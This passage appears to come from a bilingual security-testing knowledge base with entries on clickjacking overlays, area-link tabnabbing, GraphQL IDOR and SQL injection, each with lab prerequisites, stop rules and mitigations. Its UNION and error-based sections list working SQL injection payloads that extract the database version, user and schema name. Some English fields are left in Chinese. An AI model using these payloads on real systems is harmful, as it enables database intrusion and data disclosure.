overview.en: Hidden Iframe and Transparent Overlay Probes focuses on this boundary: None of the three lines creates a new tab or opener: display:none and zero size are load controls, while a transparent full-page iframe may create a UI overlay. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 风险来自透明跨层元素拦截用户点击或不受信页面被嵌入，不来自反向 Tabnabbing 的 opener 导航。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: Risk comes from a transparent layered element intercepting clicks or untrusted embedding, not from reverse-tabnabbing opener navigation. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 依次观察 iframe 是否加载、是否参与命中测试与是否接收受控点击，并比较隐藏、零尺寸和透明全屏样式。 只有第三种布局实际覆盖目标控件并把测试点击交给 iframe 才是 UI redress 阳性；后台加载或不可见 iframe 存在不等于点击劫持。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Observe iframe loading, hit testing, and receipt of one controlled click for hidden, zero-size, and transparent full-page styles. Only a layout that actually covers a target control and delivers the test click to the iframe is a UI-redress finding; background loading or iframe presence alone is not clickjacking. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 限制可嵌入来源，使用 frame-ancestors/X-Frame-Options，避免不受信 HTML 注入并对关键动作进行明确确认。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Restrict embedding origins with frame-ancestors or X-Frame-Options, prevent untrusted HTML injection, and require explicit confirmation for sensitive actions. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: 图像映射 area 的 _blank 隔离对照

description.zh: 使用 area 元素打开新浏览上下文，验证现代浏览器对 target=_blank 的隐式 noopener；该片段本身不是 XSS。
description.en: Uses an area element to open a new browsing context and verify modern implicit noopener for target=_blank; the snippet itself is not XSS.

subCategory.zh: area 链接 opener 隔离

prerequisites.zh: 完整 map/area/img 片段在当前浏览器可点击，图像与目标页均由授权测试环境托管。
prerequisites.en: The complete map, area, and img snippet is clickable in the current browser, and both image and destination are hosted in the authorized test environment.

prerequisites.zh: 记录浏览器版本、COOP 与目标页 opener 布尔值，不依赖肉眼判断新标签页。
prerequisites.en: Record browser version, COOP, and the destination's opener Boolean rather than visually inferring behavior from a new tab.

title.zh: tabnabbing via area target

description.zh: tabnabbing via area target包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: tabnabbing via area target contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 该四行 HTML 是一个完整图像映射，而不是四个独立 Payload。`area target=_blank` 在现代 HTML 行为下隐式 noopener，因此应作为兼容性负对照；仅打开新标签页、图片可点击或 href 导航成功都不是 reverse tabnabbing。
analysis.en: The four HTML lines form one image map rather than four independent payloads. An `area target=_blank` has implicit noopener in modern HTML behavior and is therefore a compatibility negative control; a new tab, clickable image, or successful href navigation is not reverse tabnabbing.

opsecTips.zh: 完成一次受控点击并确认 opener 状态后停止，不把 area 指向钓鱼页或真实业务页面。
opsecTips.en: Stop after one controlled click confirms opener state and do not point the area to phishing or real business pages.

opsecTips.zh: 删除 map/area 测试片段、图片和目标页日志，关闭新标签并清除站点存储。
opsecTips.en: Delete the map and area snippet, image, and destination logs, close the new tab, and clear site storage.

title.zh: 确认area 链接 opener 隔离前置条件

description.zh: area 的 target=_blank 与普通链接一样创建新上下文，但现代规范将其视为隐式 noopener，未显式 rel=opener 时应为负对照。 记录正常行为、组件版本、安全头、消息 schema 及相关日志。
description.en: An area with target=_blank creates a new context like a normal link, but modern behavior is implicit noopener, making this a negative control without explicit rel=opener. Record normal behavior, component versions, security headers, message schema, and relevant logs.

title.zh: 执行受控area 链接 opener 隔离对照
title.en: Run a controlled area-Link Opener Isolation comparison

description.zh: 点击唯一受控 area，目标页报告 opener 是否为 null，再与显式 rel=opener 的单独基线比较。 一次只改变一个浏览器能力、消息字段或协议边界，并使用无害标记。
description.en: Click the single controlled area, have the destination report whether opener is null, and compare it with a separate explicit rel=opener baseline. Change one browser capability, message field, or protocol boundary at a time and use a harmless marker.

title.zh: 核对area 链接 opener 隔离阳性边界
title.en: Verify area-Link Opener Isolation positive boundaries

description.zh: 现代浏览器中预期证据是 opener 为 null；只有旧实现或显式 opt-in 产生非空 opener 并允许受控导航才是阳性。 同时排除回显、客户端自执行、通用错误和手工客户端伪造能力。
description.en: The expected modern result is a null opener; only a legacy implementation or explicit opt-in producing a non-null opener with controlled navigation is positive. Also exclude reflection, client self-execution, generic errors, and capabilities introduced only by a manual client.

title.zh: 修复并回归area 链接 opener 隔离
title.en: Remediate and regress area-Link Opener Isolation

description.zh: 保持隐式/显式 noopener，必要时添加 noreferrer 与 COOP；不要为不受信 area 目标启用 rel=opener。 重放正常、阳性和阴性样例并完成测试数据清理。
description.en: Keep implicit or explicit noopener, add noreferrer and COOP where appropriate, and never opt untrusted area destinations into opener access. Replay normal, positive, and negative cases and complete test-data cleanup.

overview.zh: 图像映射 area 的 _blank 隔离对照聚焦area 的 target=_blank 与普通链接一样创建新上下文，但现代规范将其视为隐式 noopener，未显式 rel=opener 时应为负对照。 审校时必须先确认浏览器/协议版本、执行主体和受控测试对象，并保留正常基线。
overview.en: Image-Map area _blank Isolation Control focuses on this boundary: An area with target=_blank creates a new context like a normal link, but modern behavior is implicit noopener, making this a negative control without explicit rel=opener. Confirm browser or protocol version, execution principal, and controlled test objects, and retain a normal baseline.

vulnerability.zh: 只有目标页持有非空 opener 时才存在反向导航风险；图像映射、矩形坐标和新标签本身不构成漏洞。 风险必须落到实际浏览上下文、消息 sink、认证主体或后端资源，不能从字符串外观推断。
vulnerability.en: Reverse-navigation risk exists only if the destination retains a non-null opener; image maps, rectangle coordinates, and a new tab alone are not vulnerabilities. Risk must be tied to the actual browsing context, message sink, authenticated principal, or backend resource rather than inferred from string appearance.

exploitation.zh: 点击唯一受控 area，目标页报告 opener 是否为 null，再与显式 rel=opener 的单独基线比较。 现代浏览器中预期证据是 opener 为 null；只有旧实现或显式 opt-in 产生非空 opener 并允许受控导航才是阳性。 关联浏览器 DevTools、握手/消息日志和后端审计，形成明确阳性与阴性对照。
exploitation.en: Click the single controlled area, have the destination report whether opener is null, and compare it with a separate explicit rel=opener baseline. The expected modern result is a null opener; only a legacy implementation or explicit opt-in producing a non-null opener with controlled navigation is positive. Correlate browser Dev Tools, handshake or message logs, and backend audit to establish explicit positive and negative controls.

mitigation.zh: 保持隐式/显式 noopener，必要时添加 noreferrer 与 COOP；不要为不受信 area 目标启用 rel=opener。 修复后重放相同对照，合法浏览器/WebSocket 功能应保留，越权能力或解析差异应消失。
mitigation.en: Keep implicit or explicit noopener, add noreferrer and COOP where appropriate, and never opt untrusted area destinations into opener access. Replay the same controls after remediation; valid browser or Web Socket behavior should remain while unauthorized capability or parsing differences disappear.

name.zh: GraphQL Mutation 对象级授权验证

description.zh: 验证 GraphQL Mutation 解析器是否依据当前主体与目标对象的关系执行对象级和属性级授权，而不是仅信任客户端提交的 userId、role 或 isAdmin 字段。
description.en: Validate whether GraphQL mutation resolvers enforce object- and property-level authorization for the current principal instead of trusting client-supplied user Id, role, or is Admin fields.

prerequisites.zh: 准备两个权限不同的测试账户，并分别创建可识别、可恢复的测试对象。
prerequisites.en: Prepare two test accounts with different privileges and create identifiable, reversible test objects for each account.

prerequisites.zh: 记录正常 Mutation 的对象 ID、允许字段、响应和服务端授权日志基线。
prerequisites.en: 记录正常 Mutation 的对象 ID、允许字段、响应和服务端授权日志基线。

title.zh: Mutation IDOR

description.zh: Mutation IDOR包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Mutation IDOR contains multiple reproducible input samples; test them individually and record response and log differences.

analysis.zh: 确认必须同时看到低权限主体、非其所有的目标对象和可重复的状态变化；仅暴露 Mutation 名称、返回 GraphQL 错误或修改自己的对象均不算越权。
analysis.en: Confirmation requires a low-privilege principal, an object it does not own, and a repeatable state change. Exposed mutation names, GraphQL errors, or changes to the caller's own object do not establish broken authorization.

opsecTips.zh: 只操作专用测试对象，避免修改真实账户的邮箱、密码、角色或权限。
opsecTips.en: Operate only on dedicated test objects; do not change real users' email, password, role, or permissions.

opsecTips.zh: 每次只测试一个字段，并在下一次请求前恢复原值。
opsecTips.en: Test one field at a time and restore its original value before the next request.

title.zh: 建立对象所有权基线

description.zh: 由对象所有者执行最小 Mutation，记录允许字段、持久化状态和授权日志。
description.en: Have the object owner run a minimal mutation and record allowed fields, persisted state, and authorization logs.

title.zh: 替换单一对象或属性

description.zh: 由第二个测试账户提交原始 Mutation 集合，每次只改变一个对象 ID 或敏感字段。
description.en: Submit the original mutation set from the second test account, changing only one object identifier or sensitive field at a time.

title.zh: 确认未授权状态变化

description.zh: 读取目标对象并关联数据库与审计日志，区分真实写入、字段被忽略和事务回滚。
description.en: Read the target object and correlate database and audit logs to distinguish a real write from ignored fields or transaction rollback.

title.zh: 修复后执行交叉账户回归

description.zh: 加入对象和字段授权后重放所有者与非所有者请求，确认正常写入保留且越权写入被拒绝。
description.en: After adding object and field authorization, replay owner and non-owner requests to confirm legitimate writes remain and unauthorized writes are denied.

overview.zh: 该条目关注 Mutation 写操作的授权边界。先用对象所有者执行一条最小更新建立正常基线，再由另一个低权限账户仅替换对象标识或敏感属性，比较响应、持久化结果和审计日志；只有未授权状态变化才构成确认。
overview.en: This entry focuses on authorization around mutation write operations. Establish a minimal owner update, then use another low-privilege account while changing only the object identifier or sensitive property. Compare the response, persisted state, and audit logs; only an unauthorized state change confirms the issue.

vulnerability.zh: 根因通常是解析器完成身份认证后，直接按客户端 ID 加载并修改对象，或把输入对象批量绑定到 role、admin、permission 等敏感字段，却没有在每个对象和字段上校验主体权限。GraphQL 类型可见性不能替代运行时授权。
vulnerability.en: The root cause is usually a resolver that authenticates the caller but loads and mutates a client-selected object without per-object checks, or mass-assigns sensitive fields such as role, admin, and permission. GraphQL type visibility does not replace runtime authorization.

exploitation.zh: 在隔离数据中依次验证同租户他人对象、跨租户对象和敏感字段。每次只改变一个 ID 或字段，使用无害值并读取回写结果；将 GraphQL errors、HTTP 状态、数据库变更和授权日志关联，排除仅返回成功但事务回滚的假阳性。
exploitation.en: Test another user's object, a cross-tenant object, and sensitive fields in isolated data. Change one identifier or field at a time, use harmless values, and read the state back. Correlate GraphQL errors, HTTP status, database changes, and authorization logs to exclude apparent success followed by rollback.

mitigation.zh: 在每个 Query 和 Mutation 解析器中执行主体、租户、对象及字段级授权；从服务端会话派生主体标识，不接受客户端覆盖；对输入类型采用敏感字段允许列表，并为拒绝、越权尝试和高风险属性变更建立审计与回归测试。
mitigation.en: 在每个 Query 和 Mutation 解析器中执行主体、租户、对象及字段级授权；从服务端会话派生主体标识，不接受客户端覆盖；对输入类型采用敏感字段允许列表，并为拒绝、越权尝试和高风险属性变更建立审计与回归测试。

name.zh: SQL 注入边界探测

description.zh: 用于识别字符串、数字和括号上下文中的 SQL 语法边界，通过成对真假条件判断输入是否改变后端查询结构。
description.en: Identifies SQL syntax boundaries in string, numeric, and parenthesized contexts by comparing paired true and false predicates for evidence that input changed the backend query.

prerequisites.zh: 使用自有测试环境和可回滚数据集，并能在应用日志或数据库审计中关联每次请求与最终 SQL。
prerequisites.en: Use an owned test environment with a reversible dataset, and correlate each request with the final SQL through application logs or database auditing.

prerequisites.zh: 先确认参数处于字符串、数字还是括号上下文，并保存正常输入及结构相同的恒真、恒假对照响应。
prerequisites.en: First identify whether the parameter is in a string, numeric, or parenthesized context, and retain normal, structurally matched true, and false control responses.

title.zh: 基础注入
title.en: Validation step 1 for SQL Injection Boundary Probes

description.zh: 基础注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this SQL Injection Boundary Probes validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是某个最小闭合形式让恒真与恒假谓词稳定产生不同的行集、状态或业务结果，同时后端记录显示输入进入了查询结构。单独出现引号报错、一次 500、响应长度抖动、WAF 告警或页面回显原始字符串都属于假阳性边界。
analysis.en: Positive evidence is a minimal closure that makes matched true and false predicates reproducibly produce different rows, status, or business results while backend records show input entering query structure. A quote error, one HTTP 500, response-length jitter, a WAF alert, or reflection of the raw string alone is a false positive.

opsecTips.zh: 识别出一个可重复的闭合方式和真/假差异后立即停止，不再尝试额外注释、嵌套深度或数据读取。
opsecTips.en: Stop as soon as one repeatable closure and true/false differential is identified; do not continue with extra comments, nesting depths, or data reads.

opsecTips.zh: 回滚测试行，清除请求关联标记和临时详细错误输出，并恢复参数化查询与原有日志级别。
opsecTips.en: Roll back test rows, clear request-correlation markers and temporary verbose errors, and restore parameterized queries and the original logging level.

title.zh: 确认基础语法边界探测前置条件

description.zh: 覆盖引号、注释符、括号和恒真条件；用途是定位闭合方式，而不是把一次异常响应直接当作 SQL 注入结论。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: Covers quotes, comments, parentheses, and always-true predicates to locate the closing context rather than treating one anomalous response as proof. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控基础语法边界探测探针
title.en: Run a controlled Basic Syntax-Boundary Probing probe

description.zh: 先记录合法值，再按字段类型逐个测试引号或括号闭合，并用结构一致的恒真与恒假条件组成对照。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Record a valid value first, then test quote or parenthesis closure appropriate to the field type with structurally identical true and false controls. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

title.zh: 核对基础语法边界探测成功证据

description.zh: 只有实际业务记录、授权对象或数据库日志中的最终查询出现可重复差异，才能确认；页面字数和单次错误都不足以证明。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Confirm only when business records, authorized objects, or the final query in database logs differ reproducibly; page length and one error are insufficient. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归基础语法边界探测
title.en: Remediate and regress Basic Syntax-Boundary Probing

description.zh: 所有数据值使用预编译语句或参数化 API，整数、枚举和标识符分别执行严格类型与允许列表校验，并统一外部数据库错误。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Use prepared statements or parameterized APIs, validate integers and enums strictly, allowlist identifiers, and normalize external database errors. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: SQL 注入边界探测聚焦覆盖引号、注释符、括号和恒真条件；用途是定位闭合方式，而不是把一次异常响应直接当作 SQL 注入结论。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: SQL Injection Boundary Probes focuses on this boundary: Covers quotes, comments, parentheses, and always-true predicates to locate the closing context rather than treating one anomalous response as proof. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 应用把不可信值直接拼进 SQL 文本，使输入能够关闭原字面量或表达式并追加布尔逻辑；宽松类型与多层解码会扩大差异。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: The application concatenates untrusted values into SQL text, allowing input to close a literal or expression and append Boolean logic; weak typing and layered decoding amplify the gap. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 先记录合法值，再按字段类型逐个测试引号或括号闭合，并用结构一致的恒真与恒假条件组成对照。 只有实际业务记录、授权对象或数据库日志中的最终查询出现可重复差异，才能确认；页面字数和单次错误都不足以证明。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Record a valid value first, then test quote or parenthesis closure appropriate to the field type with structurally identical true and false controls. Confirm only when business records, authorized objects, or the final query in database logs differ reproducibly; page length and one error are insufficient. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 所有数据值使用预编译语句或参数化 API，整数、枚举和标识符分别执行严格类型与允许列表校验，并统一外部数据库错误。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Use prepared statements or parameterized APIs, validate integers and enums strictly, allowlist identifiers, and normalize external database errors. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: UNION 查询注入

description.zh: 逐步匹配原查询列数与类型，将受控 UNION SELECT 行并入响应，以验证可见的查询结构注入。
description.en: Progressively matches the original query's column count and types and merges a controlled UNION SELECT row into the response to validate visible query-structure injection.

prerequisites.zh: 确认测试查询存在可观察的返回列，并在测试表中放置不会与真实数据混淆的固定标记值。
prerequisites.en: Confirm that the test query has an observable output column and place a fixed, unmistakable marker value in a test table.

prerequisites.zh: 用 NULL 或常量在隔离环境中确定列数、顺序和类型兼容性，同时保留不含 UNION 的同参数基线。
prerequisites.en: 用 NULL 或常量在隔离环境中确定列数、顺序和类型兼容性，同时保留不含 UNION 的同参数基线。

title.zh: UNION 注入
title.en: Validation step 1 for UNION Query Injection

execution.command:
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
UNION SELECT 1,2,3,4
UNION SELECT 1,2,3,4,5
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION DISTINCT SELECT 1,2,3
UNION DISTINCT SELECT 1,2,3,4
1 UNION SELECT 1,2,3
1' UNION SELECT 1,2,3--
1" UNION SELECT 1,2,3--
1) UNION SELECT 1,2,3--
1') UNION SELECT 1,2,3--
1") UNION SELECT 1,2,3--

description.zh: UNION 注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this UNION Query Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性要求响应中出现只能来自受控 UNION 分支的固定标记，且 SQL 审计确认兼容列结构已并入原查询。仅有列数错误、类型转换错误、普通页面数字、用户输入回显或猜中列数但没有标记行，都不能证明 UNION 注入。
analysis.en: A positive result requires a fixed marker that can only originate from the controlled UNION branch to appear in the response, with SQL auditing confirming the compatible projection was merged into the original query. Column-count or type errors, ordinary page numbers, reflected input, or guessing the column count without a marker row do not prove UNION injection.

opsecTips.zh: 固定标记首次通过一个兼容列返回后停止，不继续枚举系统目录、用户表或敏感列。
opsecTips.en: Stop after the fixed marker is returned through one compatible column; do not enumerate catalogs, user tables, or sensitive columns.

opsecTips.zh: 删除标记行和临时视图，撤销为验证授予的 SELECT 权限，并清理页面缓存与关联查询日志中的测试值。
opsecTips.en: Delete marker rows and temporary views, revoke SELECT grants added for validation, and clear the test value from page caches and correlated query logs.

title.zh: 确认UNION 查询注入前置条件

description.zh: UNION 注入要求原结果可回显，且追加查询在列数、顺序和类型上兼容；应先使用 NULL 或固定标记绘制结构。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: UNION injection requires reflected output and compatible column count, order, and types; map the shape first with NULL values or fixed markers. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控UNION 查询注入探针
title.en: Run a controlled UNION Query Injection probe

description.zh: 从单列开始递增 NULL 占位符，保留列数不匹配的负对照，再将不同无害标记放入候选可见列。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Increment NULL placeholders from one column, retain a mismatched-count negative control, and place distinct harmless markers in candidate reflected columns. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

attackChain.payload:
' UNION SELECT 1--
' UNION SELECT 1,2--
' UNION SELECT 1,2,3--
' UNION SELECT 1,2,3,4--
' UNION SELECT 1,2,3,4,5--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL--
' UNION SELECT NULL,NULL,NULL,NULL,NULL--
UNION SELECT 1
UNION SELECT 1,2
UNION SELECT 1,2,3
UNION SELECT 1,2,3,4
UNION SELECT 1,2,3,4,5
UNION ALL SELECT 1
UNION ALL SELECT 1,2
UNION ALL SELECT 1,2,3
UNION ALL SELECT 1,2,3,4
UNION ALL SELECT 1,2,3,4,5
UNION DISTINCT SELECT 1,2,3
UNION DISTINCT SELECT 1,2,3,4
1 UNION SELECT 1,2,3
1' UNION SELECT 1,2,3--
1" UNION SELECT 1,2,3--
1) UNION SELECT 1,2,3--
1') UNION SELECT 1,2,3--
1") UNION SELECT 1,2,3--

title.zh: 核对UNION 查询注入成功证据

description.zh: 标记必须稳定出现在服务端查询返回的数据位置，并排除请求反射、客户端渲染和缓存；真实数据读取不是确认所必需。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: A marker must appear consistently in server-returned query data after excluding request reflection, client rendering, and caching; real-data access is unnecessary. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归UNION 查询注入
title.en: Remediate and regress UNION Query Injection

description.zh: 参数化所有过滤值，将动态排序、列名和表名映射到固定允许列表，并限制数据库账户只访问业务所需表列。 使用相同三组基线重放，正常业务必须继续工作，而注入内容不得再改变最终查询或授权结果。
description.en: Parameterize filter values, map dynamic sort keys and identifiers to fixed allowlists, and restrict the database account to required tables and columns. Replay the same three controls; valid business behavior must remain and injected input must no longer alter final queries or authorization.

overview.zh: UNION 查询注入聚焦UNION 注入要求原结果可回显，且追加查询在列数、顺序和类型上兼容；应先使用 NULL 或固定标记绘制结构。 审校时必须先确认适用的数据库、解析层和请求上下文，并保留正常请求作为对照。
overview.en: UNION Query Injection focuses on this boundary: UNION injection requires reflected output and compatible column count, order, and types; map the shape first with NULL values or fixed markers. Confirm the applicable database, parsing layer, and request context, and retain a normal-request control.

vulnerability.zh: 输入被拼进 SELECT 条件后，可以结束原谓词并追加集合运算；错误处理与模板回显会暴露列结构。 根因仍需追溯到数据与查询结构未隔离，而不能把 WAF 命中或数据库产品差异当作漏洞本身。
vulnerability.en: Input concatenated into a SELECT predicate can terminate it and append a set operation, while errors and reflected templates expose the column shape. The root cause must still be traced to a failure to separate data from query structure, rather than to a WAF match or a product difference alone.

exploitation.zh: 从单列开始递增 NULL 占位符，保留列数不匹配的负对照，再将不同无害标记放入候选可见列。 标记必须稳定出现在服务端查询返回的数据位置，并排除请求反射、客户端渲染和缓存；真实数据读取不是确认所必需。 测试过程应记录请求字节、应用参数、数据库日志和最终业务对象，形成可重复证据链。
exploitation.en: Increment NULL placeholders from one column, retain a mismatched-count negative control, and place distinct harmless markers in candidate reflected columns. A marker must appear consistently in server-returned query data after excluding request reflection, client rendering, and caching; real-data access is unnecessary. Record request bytes, application parameters, database logs, and final business objects to create a repeatable evidence chain.

mitigation.zh: 参数化所有过滤值，将动态排序、列名和表名映射到固定允许列表，并限制数据库账户只访问业务所需表列。 修复后重放同一正常、阳性和阴性对照，确认业务功能保留，且原先的查询结构或证据差异完全消失。
mitigation.en: Parameterize filter values, map dynamic sort keys and identifiers to fixed allowlists, and restrict the database account to required tables and columns. After remediation, replay the same normal, positive, and negative controls to confirm valid behavior remains and the former query-structure difference is gone.

name.zh: 跨数据库报错型 SQL 注入

description.zh: 覆盖 SQL Server 类型转换和 MySQL XML、JSON、GTID、地理函数等报错通道，用受控异常验证表达式执行。
description.en: Covers SQL Server conversion errors and MySQL XML, JSON, GTID, and geospatial error channels to validate expression execution with controlled failures.

prerequisites.zh: 从连接信息或服务端指纹确认具体 DBMS 与版本，只选择该版本实际支持的转换、XML、JSON、GTID 或空间函数。
prerequisites.en: Confirm the exact DBMS and version from connection or server evidence, and select only conversion, XML, JSON, GTID, or spatial functions supported by that version.

prerequisites.zh: 配置受控异常捕获并使用随机合成标记表达式，分别保存普通语法错误和不支持函数的对照。
prerequisites.en: Configure controlled exception capture with a random synthetic marker expression, and retain separate controls for ordinary syntax errors and unsupported functions.

title.zh: 报错注入
title.en: Validation step 1 for Cross-DBMS Error-Based SQL Injection

execution.command:
' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT database()))--
' AND 1=CONVERT(int,(SELECT user()))--
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT user())))--
' AND updatexml(1,concat(0x7e,(SELECT @@version)),1)--
' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT @@version),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND exp(~(SELECT * FROM (SELECT @@version)a))--
' AND exp(~(SELECT * FROM (SELECT database())a))--
' AND exp(~(SELECT * FROM (SELECT user())a))--
' AND GTID_SUBSET((SELECT @@version),1)--
' AND GTID_SUBSET((SELECT database()),1)--
' AND JSON_KEYS((SELECT CONCAT(0x7e,(SELECT @@version))))--
' AND JSON_KEYS((SELECT CONCAT(0x7e,(SELECT database()))))--
' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,(SELECT @@version))))--
' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,(SELECT database()))))--
' AND ST_LongFromGeoHash((SELECT CONCAT(0x7e,(SELECT @@version))))--
' AND ST_LongFromGeoHash((SELECT CONCAT(0x7e,(SELECT database()))))--
' AND ELT(1=1,1)--
' AND ELT(1=2,1)--
' AND MAKE_SET(1=1,1)--
' AND MAKE_SET(1=2,1)--

description.zh: 报错注入包含多个可复现输入样例；应逐条测试并记录响应与日志差异。
description.en: Run this Cross-DBMS Error-Based SQL Injection validation command in an authorized lab, preserve the output, and compare it with the documented baseline.

analysis.zh: 阳性证据是兼容的报错函数执行了受控子表达式，并在数据库异常或经过授权的测试响应中携带预置标记。通用 SQL 错误、函数不存在、版本不兼容、网关统一 500、或错误文本只重复请求内容都是假阳性。
analysis.en: Positive evidence is a compatible error function evaluating the controlled subexpression and carrying the preset marker in a database exception or authorized test response. A generic SQL error, missing function, incompatible version, uniform gateway 500, or error text that only repeats request content is a false positive.

opsecTips.zh: 一个低敏感固定标记进入错误通道后即停止，不把版本、当前用户或真实目录内容作为后续提取目标。
opsecTips.en: Stop once one low-sensitivity fixed marker enters the error channel; do not proceed to extract versions, current users, or real catalog content.

opsecTips.zh: 恢复通用错误页与异常脱敏设置，删除测试标记和详细堆栈记录，并关闭临时数据库跟踪。
opsecTips.en: Restore generic error pages and exception redaction, delete test markers and verbose stack records, and disable temporary database tracing.

title.zh: 确认报错型 SQL 注入前置条件

description.zh: 集合横跨 SQL Server 与多个 MySQL 版本函数，必须先识别 DBMS 和版本，再选择兼容分支；不兼容函数错误不等于数据泄露。 同时记录数据库产品、版本、驱动、字段类型以及正常响应和服务端日志基线。
description.en: The set spans SQL Server and functions from several MySQL versions, so identify the DBMS and version before choosing a compatible branch; an unsupported-function error is not disclosure. Record the database product, version, driver, field type, normal response, and server-log baseline.

title.zh: 执行受控报错型 SQL 注入探针
title.en: Run a controlled Error-Based SQL Injection probe

description.zh: 先比较正常表达式、固定类型错误和不存在函数三组响应，再只用与版本匹配的函数嵌入一个无害常量。 一次只改变一个变量，并保留结构一致的阴性对照，避免把多个方言或技术混在同一请求中。
description.en: Compare normal expression, fixed type error, and unknown-function responses, then embed one harmless constant using a function compatible with the confirmed version. Change one variable at a time and keep a structurally identical negative control instead of mixing dialects or techniques in one request.

' AND 1=CONVERT(int,(SELECT @@version))--
' AND 1=CONVERT(int,(SELECT database()))--
' AND 1=CONVERT(int,(SELECT user()))--
' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
' AND extractvalue(1,concat(0x7e,(SELECT user())))--

' AND updatexml(1,concat(0x7e,(SELECT database())),1)--
' AND updatexml(1,concat(0x7e,(SELECT user())),1)--

' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT database()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--
' AND (SELECT 1 FROM(SELECT count(*),concat((SELECT user()),floor(rand(0)*2))x FROM information_schema.tables GROUP BY x)a)--

' AND exp(~(SELECT * FROM (SELECT database())a))--
' AND exp(~(SELECT * FROM (SELECT user())a))--

' AND GTID_SUBSET((SELECT database()),1)--

' AND JSON_KEYS((SELECT CONCAT(0x7e,(SELECT database()))))--

' AND ST_LatFromGeoHash((SELECT CONCAT(0x7e,(SELECT database()))))--

' AND MAKE_SET(1=2,1)--

title.zh: 核对报错型 SQL 注入成功证据

description.zh: 服务端异常日志必须稳定包含受控常量，并能对应到同一请求；普通语法错误、错误页变化或函数缺失都属于假阳性。 将边界设备、应用和数据库时间戳关联，排除缓存、重试、通用错误页和网络抖动。
description.en: Server exception logs must consistently contain the controlled constant and correlate to the request; syntax errors, changed error pages, or missing functions are false positives. Correlate timestamps across edge, application, and database logs and exclude caching, retries, generic error pages, and network jitter.

title.zh: 修复并回归报错型 SQL 注入
title.en: Remediate and regress Error-Based SQL Injection

